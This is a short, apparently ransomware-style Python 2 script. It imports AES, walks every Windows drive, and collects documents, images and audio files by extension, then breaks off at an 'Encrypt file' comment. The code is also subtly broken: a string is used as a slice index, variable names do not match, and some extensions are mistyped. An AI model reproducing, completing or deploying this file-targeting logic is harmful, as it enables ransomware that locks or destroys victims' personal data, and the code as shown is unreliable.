import os, random, struct, hashlib, time, win32api
from Crypto.Cipher import AES

extensions = ['.mp3', '.txt', '.docx', '.doc', '.xlxs', '.png', '.jpg', 'jpeg']

def pega_arquivos(key):
    for drive in win32api.GetLogicalDriveStrings().split('\000')[':-1']:
        for roots, dirs, files in os.walk(drive):
            for file in files:
                if file.endswith(tuple(extensions)):
                    in_filename = (os.path.join(root, file))
                    print "[+] - File Located = [+]"
                    print in_filename
                    
                    #Encrypt file
                    print '[+] '